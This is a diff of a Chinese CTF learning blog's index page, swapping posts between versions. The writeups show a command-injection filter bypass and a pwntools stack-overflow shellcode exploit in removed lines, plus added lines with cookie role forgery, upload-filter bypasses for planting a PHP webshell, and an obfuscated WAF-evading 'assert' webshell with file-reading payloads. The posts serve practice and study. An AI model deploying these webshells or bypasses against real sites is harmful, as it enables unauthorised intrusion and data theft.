@@ -96,7 +96,7 @@
     
     
     <article
-  id="post-calc2"
+  id="post-i春秋-file-get-contents-wirteup"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -107,16 +107,16 @@
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2019/04/19/calc2/"
-    >calc2</a> 
+  <a class="article-title" href="/2018/12/05/i%E6%98%A5%E7%A7%8B-file-get-contents-wirteup/"
+    >i春秋 file_get_contents wirteup</a> 
 </h2>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2019/04/19/calc2/" class="article-date">
-  <time datetime="2019-04-19T09:38:14.000Z" itemprop="datePublished">2019-04-19</time>
+      <a href="/2018/12/05/i%E6%98%A5%E7%A7%8B-file-get-contents-wirteup/" class="article-date">
+  <time datetime="2018-12-05T12:04:24.000Z" itemprop="datePublished">2018-12-05</time>
 </a> 
   <div class="article-category">
     <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a>
@@ -126,27 +126,10 @@
       
     <div class="article-entry" itemprop="articleBody">
        
-  <p>今天做了一个web题，emmmm，以前没有遇到过，涨姿势。。。</p>
-<pre><code>http://139.224.220.67:30008，这个是六星战队的一个ctf联系平台</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb999e4ed8ea.png" alt></p>
-<pre><code>首先是 shell_exec（） 这个函数，百度查了一下，命令执行，emmm</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99b6feb0c6.png" alt></p>
-<pre><code>首先是将输入的 &amp;str 传入 bc 再通过shell_exec() 执行，再echo回显出来</code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ce305a30.png" alt></p>
-<pre><code>ls一下看到了当前文件夹下的文件，flag就在里面
-
-接着打算直接cat flag，然而并不行
-
-if(!empty($_GET)){
-$str=$_GET[&quot;calc&quot;];
-if(strpos($str,&quot;#&quot;)!==false)
-    die;
-if(strpos($str,&quot;`&quot;)!==false)
-    die;
-if(strpos($str,&quot;flag&quot;)!==false)
-    die;
-
-成了,flag被过滤了
-
-嗯，换一个命令 grep </code></pre><p><img src="https://i.loli.net/2019/04/19/5cb99ebfcf1e8.png" alt></p>
-<pre><code>拿到flag</code></pre> 
+  <p>file_get_contents 用于 将整个文件读入一个字符串</p>
+<p>file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法。如果操作系统支持还会使用内存映射技术来增强性能。</p>
+<p>用法<br>$homepage = file_get_contents(‘filename’);</p>
+ 
       <!-- reward -->
       
     </div>
@@ -156,7 +139,7 @@ if(strpos($str,&quot;flag&quot;)!==false)
     
     <footer class="article-footer">
        
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%AD%A6%E4%B9%A0/" rel="tag">ctf学习</a></li></ul>
 
     </footer>
   </div>
@@ -168,7 +151,7 @@ if(strpos($str,&quot;flag&quot;)!==false)
 
     
     <article
-  id="post-hitcon-lab3"
+  id="post-i春秋模拟上传wirteup"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -179,56 +162,35 @@ if(strpos($str,&quot;flag&quot;)!==false)
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2019/04/18/hitcon-lab3/"
-    >hitcon  lab3 </a> 
+  <a class="article-title" href="/2018/12/02/i%E6%98%A5%E7%A7%8B%E6%A8%A1%E6%8B%9F%E4%B8%8A%E4%BC%A0wirteup/"
+    >i春秋 模拟上传 wirteup</a> 
 </h2>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2019/04/18/hitcon-lab3/" class="article-date">
-  <time datetime="2019-04-18T13:24:46.000Z" itemprop="datePublished">2019-04-18</time>
+      <a href="/2018/12/02/i%E6%98%A5%E7%A7%8B%E6%A8%A1%E6%8B%9F%E4%B8%8A%E4%BC%A0wirteup/" class="article-date">
+  <time datetime="2018-12-02T12:04:24.000Z" itemprop="datePublished">2018-12-02</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/">逆向学习</a>
+    <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a>
   </div>
    
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <p>lab3这道题是一个基本的栈溢出</p>
-<pre><code>先用ida分析ret2sc文件</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87b3a035c1.png" alt></p>
-<pre><code>程序显示先是read &quot;&amp;name&quot;，然后溢出v4的缓冲区，
+  <p>网址    <a href="http://106.75.72.168:2222/" target="_blank" rel="noopener">http://106.75.72.168:2222/</a></p>
+<p>Sorry. You have no permissions.</p>
+<p>既然没有提示，也没有其他的链接，那么可能有以下几种可能：<br>       1、敏感文件泄漏<br>       2、跳转<br>       3、cookie / session<br>       第一个想法在经过扫描器扫描之后就放弃了，因为只看到index.php，还有/upload/，但是在访问的时候是403<br>       第二个在抓包的时候也没有看到有跳转<br>       只剩下第三个</p>
+<p>抓包发现cookie    Cookie: role=Zjo1OiJ0aHJmZyI7”</p>
+<p>base64解码后   “ f:5:”thrfg”; 初步判断为rot13 thrfg为guest<br>将其改为base64(rot13(admin))</p>
+<!-- $filename = $_POST['filename']; $data = $_POST['data']; -->
 
-由此我们可以将shellcode跳转到name的地址去执行，然后得到shel，这是基本思路
-
-首先看一下&amp;name的地址，双击&amp;name可以看到</code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87ddce5128.png" alt></p>
-<pre><code>地址为0x0804A060
-
-直接上exp：
-
-from pwn import *
-
-&apos;&apos;&apos;A)AA found at offset: 32&apos;&apos;&apos;
-
-context.log_level = &apos;debug&apos;
-
-io = process(&apos;ret2sc&apos;)
-
-sc = asm(shellcraft.sh())
-
-ret2 = &apos;A&apos;*32 + p32(0x0804A060)
-
-io.sendafter(&apos;Name:&apos;,sc)
-
-io.sendafter(&apos;best:&apos;,ret2)
-
-io.interactive()
-
-直接运行  </code></pre><p><img src="https://i.loli.net/2019/04/18/5cb87f55ab5e5.png" alt></p>
-<pre><code>ok，拿到shell，直接cat flag就行了</code></pre> 
+<p>发现源代码</p>
+<p>post提交 filename=1.php&amp;data[]=<?php phpinfo();?>得到flag</p>
+ 
       <!-- reward -->
       
     </div>
@@ -238,7 +200,7 @@ io.interactive()
     
     <footer class="article-footer">
        
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hitcon/" rel="tag">Hitcon</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%AD%A6%E4%B9%A0/" rel="tag">ctf学习</a></li></ul>
 
     </footer>
   </div>
@@ -250,7 +212,7 @@ io.interactive()
 
     
     <article
-  id="post-Hitcon-lab1"
+  id="post-bugku文件上传wirteup"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -261,43 +223,28 @@ io.interactive()
     <header class="article-header">
        
 <h2 itemprop="name">
-  <a class="article-title" href="/2019/04/17/Hitcon-lab1/"
-    >Hitcon lab1</a> 
+  <a class="article-title" href="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/"
+    >bugku 文件上传 wirteup</a> 
 </h2>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2019/04/17/Hitcon-lab1/" class="article-date">
-  <time datetime="2019-04-17T12:07:14.000Z" itemprop="datePublished">2019-04-17</time>
+      <a href="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/" class="article-date">
+  <time datetime="2018-11-28T02:30:26.000Z" itemprop="datePublished">2018-11-28</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/">逆向学习</a>
+    <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a>
   </div>
    
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <p>做为一个刚开始学习pwn的小白，很多地方都不会，DALAO勿喷…</p>
-<pre><code>Hitcon这个是le3ding大佬推给我的
-
-
-这个是GitHub地址 https://github.com/scwuaptx/HITCON-Training 有需要的可以自己git
-
-
-——————————分割线——————————
-
-lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb用法
-
-用ida打开可以看到get_flag这个函数</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71ac83b8f4.png" alt></p>
-<pre><code>然后查看sysmagic.c文件</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb71f4f9d05f.png" alt></p>
-<pre><code>经过观察，flag的生成与输入无关，因此可以通过调试直接获得flag
-
-将if(password == magic)改为if(password ！= magic)
-
-运行./sysmagic</code></pre><p><img src="https://i.loli.net/2019/04/17/5cb7219445d51.png" alt></p>
+  <p><img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/0rn6779r.bmp" alt><br>/很显然只允许上传图片格式，不允许上传PHP脚本，但是我们就是要上传一句话木马！<br>提交之后抓包</p>
+<p>这道题是后缀名黑名单检测和类型检测<br>        1. 把请求头里面的Content-Type字母改成大写进行绕过<br>        2. .jpg后面加上.php5其他的都被过滤了好像<br> 如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag</p>
+<p>要修改三个地方：<br>1、扩展名filename<br>2、filename下面一行的Content-Type:image/jpeg<br>3、最最最重要的是请求头里的Content-Type字段，进行大小写绕过，也就是把multipart/form-data中任意一个字母改成大写即可<br> <img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/c2zulbcl.bmp" alt></p>
  
       <!-- reward -->
       
@@ -308,7 +255,7 @@ lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb�
     
     <footer class="article-footer">
        
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hitcon/" rel="tag">Hitcon</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%AD%A6%E4%B9%A0/" rel="tag">ctf学习</a></li></ul>
 
     </footer>
   </div>
@@ -343,7 +290,7 @@ lab1可以说基本上没有用到Pwn，只是简单的逆向，了解ida、gdb�
   <time datetime="2018-11-28T02:30:26.000Z" itemprop="datePublished">2018-11-28</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">-CTF学习</a>
+    <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a>
   </div>
    
     </div>
@@ -382,62 +329,7 @@ if (isset($_GET['uname']) and isset($_POST['passwd'])) {
     
     <footer class="article-footer">
        
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-ctf%E5%AD%A6%E4%B9%A0/" rel="tag">-Web -ctf学习</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-   
-</article>
-
-    
-    <article
-  id="post-bugku文件上传wirteup"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/"
-    >bugku 文件上传 wirteup</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/" class="article-date">
-  <time datetime="2018-11-28T02:30:26.000Z" itemprop="datePublished">2018-11-28</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">-CTF学习</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p><img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/0rn6779r.bmp" alt><br>/很显然只允许上传图片格式，不允许上传PHP脚本，但是我们就是要上传一句话木马！<br>提交之后抓包</p>
-<p>这道题是后缀名黑名单检测和类型检测<br>        1. 把请求头里面的Content-Type字母改成大写进行绕过<br>        2. .jpg后面加上.php5其他的都被过滤了好像<br> 如果是walf严格匹配，通过修改Content-type后字母的大小写可以绕过检测，使得需要上传的文件可以到达服务器端，而服务器的容错率较高，一般我们上传的文件可以解析。然后就需要确定我们如何上传文件，在分别将后缀名修改为php2, php3, php4, php5, phps, pht, phtm, phtml（php的别名），发现只有php5没有被过滤，成功上传，得到flag</p>
-<p>要修改三个地方：<br>1、扩展名filename<br>2、filename下面一行的Content-Type:image/jpeg<br>3、最最最重要的是请求头里的Content-Type字段，进行大小写绕过，也就是把multipart/form-data中任意一个字母改成大写即可<br> <img src="/2018/11/28/bugku%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0wirteup/c2zulbcl.bmp" alt></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-ctf%E5%AD%A6%E4%B9%A0/" rel="tag">-Web -ctf学习</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%AD%A6%E4%B9%A0/" rel="tag">ctf学习</a></li></ul>
 
     </footer>
   </div>
@@ -472,7 +364,7 @@ if (isset($_GET['uname']) and isset($_POST['passwd'])) {
   <time datetime="2018-11-26T01:01:54.000Z" itemprop="datePublished">2018-11-26</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">-CTF学习</a>
+    <a class="article-category-link" href="/categories/CTF%E5%AD%A6%E4%B9%A0/">CTF学习</a>
   </div>
    
     </div>
@@ -500,7 +392,77 @@ if (isset($_GET['uname']) and isset($_POST['passwd'])) {
     
     <footer class="article-footer">
        
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-ctf%E5%AD%A6%E4%B9%A0/" rel="tag">-Web -ctf学习</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf%E5%AD%A6%E4%B9%A0/" rel="tag">ctf学习</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+   
+</article>
+
+    
+    <article
+  id="post-过狗一句话小技巧"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2018/11/25/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%B0%8F%E6%8A%80%E5%B7%A7/"
+    >过狗一句话小技巧</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2018/11/25/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="article-date">
+  <time datetime="2018-11-25T07:03:03.000Z" itemprop="datePublished">2018-11-25</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/SQl%E6%B3%A8%E5%85%A5/">SQl注入</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <?php $poc="a#s#s#e#r#t"; 
+
+$poc_1=explode("#",$poc);
+
+$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];
+
+$poc_2($_GET['s']) 
+
+?>
+
+
+
+<pre><code>1. s=print_r(scandir(&apos;./&apos;)) 然后读取flag.txt
+
+2. s=print_r(glob(&quot;*.*&quot;)) 然后读取show_source(flag.txt)
+
+3. 使用file_get_contents(flag.txt)读取文件
+
+eg: 还有system(&apos;ls&apos;)的读取方法但是这里应该没有权限.</code></pre> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/" rel="tag">注入技巧</a></li></ul>
 
     </footer>
   </div>
